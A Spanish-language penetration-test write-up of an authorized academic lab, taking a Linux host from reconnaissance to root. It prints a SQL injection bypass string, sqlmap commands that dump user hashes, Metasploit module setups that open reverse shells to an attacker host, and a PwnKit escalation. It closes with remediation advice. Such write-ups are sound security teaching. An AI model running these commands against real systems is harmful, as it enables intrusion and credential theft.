# Auditoría de intrusión sobre infraestructura Linux

> Pentest de una máquina Linux con múltiples servicios vulnerables: desde el
> reconocimiento hasta **root**, explotando varios vectores independientes
> (web, SQLi y FTP) y escalando privilegios con PwnKit.

**Tipo:** Pentest de sistemas / aplicación web
**Entorno:** laboratorio académico (U-TAD)
**Resultado:** compromiso total del sistema (root)

> ⚠️ **Nota:** ejercicio en laboratorio controlado y autorizado. Credenciales, hashes
> y datos del escenario se han ofuscado; el foco es la **metodología**. Las IPs son de
> la red privada del laboratorio.

---

## 1. Resumen

Auditoría sobre una máquina Linux (`10.0.2.20`) que expone FTP, SSH, HTTP (Drupal + una
app de nóminas) y Samba. La combinación de un SO fuera de soporte y software
desactualizado permite el compromiso por **tres vías independientes**, y una escalada
final a root vía PwnKit.

### Hallazgos

| # | Hallazgo | Severidad |
|---|---|---|
| 1 | Ubuntu 14.04 **End of Life** (sin parches de seguridad) | Crítica |
| 2 | ProFTPD `mod_copy` (CVE-2015-3306): copia de ficheros sin autenticación → RCE | Crítica |
| 3 | Drupal módulo Coder: RCE no autenticado por deserialización PHP insegura | Crítica |
| 4 | SQL injection + bypass de autenticación en la app de nóminas | Crítica |
| 5 | Escalada local a root vía PwnKit (CVE-2021-4034, pkexec/Polkit) | Crítica |
| 6 | Cifrados SSL débiles de 64 bits (SWEET32) | Media |

---

## 2. Reconocimiento y enumeración

Descubrimiento del host en el segmento local con `arp-scan` (pasivo, poco ruidoso):

```bash
sudo arp-scan --localnet
```

Escaneo de servicios y versiones con Nmap:

```bash
nmap -sV -sC -p- 10.0.2.20 --open -oN nmap.txt
```

Servicios expuestos:

| Puerto | Servicio |
|---|---|
| 21/tcp | ProFTPD 1.3.5 |
| 22/tcp | OpenSSH 6.6.1p1 (Ubuntu) |
| 80/tcp | Apache 2.4.7 — Drupal + `payroll_app.php` |
| 445/tcp | Samba 4.3.11 |

---

## 3. Análisis de vulnerabilidades

Con **Nessus Essentials** se validan y priorizan los hallazgos por CVSS. Los críticos
(9.8–10.0):

- **SO End of Life** (Ubuntu 14.04): sin parches → alta probabilidad de fallos de kernel.
- **ProFTPD mod_copy (CVE-2015-3306):** `SITE CPFR` / `SITE CPTO` permiten copiar ficheros
  **sin autenticación**.
- **Drupal Coder RCE:** ejecución remota no autenticada por deserialización PHP insegura.
- **SQLi en la API de Drupal** y **SWEET32** en el SSL (cifrados de 64 bits).

---

## 4. Explotación y acceso inicial

### 4.1. Vector web: fallo lógico + SQL injection

Enumeración de usuarios abusando de la respuesta diferenciada del CMS
(`?q=user/<ID>` devuelve "Access denied" vs "Page not found"), lo que permite mapear qué
IDs existen.

La app de nóminas permite **acceso con el formulario vacío** (falta de validación en
servidor) y, además, **bypass por SQLi** en el campo de usuario:

```
' OR 1=1 -- -
```

La condición se evalúa siempre verdadera → acceso a los datos de nóminas.

### 4.2. Exfiltración con SQLMap

```bash
sqlmap -u "http://10.0.2.20/..." --dbs            # enumera esquemas → 'drupal'
sqlmap -u "http://10.0.2.20/..." -D drupal -T users --dump
```

Se vuelca la tabla `users` completa (usuarios + hashes) → compromiso de la
confidencialidad de la BBDD.

### 4.3. RCE vía ProFTPD mod_copy (Metasploit)

```
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS 10.0.2.20
set payload cmd/unix/reverse_perl
set LHOST <IP_atacante>
run
```

El exploit abusa de la copia no autenticada para alojar y ejecutar código en
`/var/www/html` → shell como **www-data**.

### 4.4. Segundo RCE vía Drupal Coder (redundancia de acceso)

```
use exploit/multi/http/drupal_coder_exec
set payload cmd/unix/reverse_bash
set TARGETURI /drupal/
set LHOST <IP_atacante>
run
```

Segundo vector independiente → otra shell **www-data**, confirmando el compromiso por
múltiples vías.

---

## 5. Post-explotación y escalada a root

### 5.1. Upgrade a Meterpreter

Las shells básicas limitan la post-explotación. Se pasa la sesión a segundo plano y se
mejora:

```
use post/multi/manage/shell_to_meterpreter
```

### 5.2. Identificación de vías de escalada

```
use post/multi/recon/local_exploit_suggester
```

Sugiere varias, entre ellas **PwnKit (CVE-2021-4034)**, fallo crítico en `pkexec` (Polkit).

### 5.3. Explotación de PwnKit → root

```
use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
set SESSION 2
run
```

Abre una nueva sesión; `getuid` confirma **uid=0 (root)**. Acceso total al sistema,
incluido el directorio raíz.

---

## 6. Recomendaciones

- **Actualizar el SO**: Ubuntu 14.04 está fuera de soporte; migrar a una versión con
  mantenimiento es la prioridad número uno.
- **Parchear/retirar servicios vulnerables**: actualizar ProFTPD y Drupal; deshabilitar
  `mod_copy` y el módulo Coder si no se usan.
- **App de nóminas**: validar la entrada en servidor, usar consultas parametrizadas
  (evita el SQLi) y no permitir envíos con campos vacíos.
- **Aplicar el parche de Polkit** para PwnKit en todas las máquinas.
- **SSL**: deshabilitar los cifrados de 64 bits para mitigar SWEET32.

---

## Técnicas y herramientas

`arp-scan` · `nmap` · Nessus · SQL injection · `sqlmap` · Metasploit
(`proftpd_modcopy_exec`, `drupal_coder_exec`, `shell_to_meterpreter`,
`local_exploit_suggester`) · PwnKit (CVE-2021-4034)

**Mapa ATT&CK (resumen):** T1595 (escaneo activo) · T1190 (explotación de app pública) ·
T1059 (ejecución por línea de comandos) · T1068 (escalada por explotación)
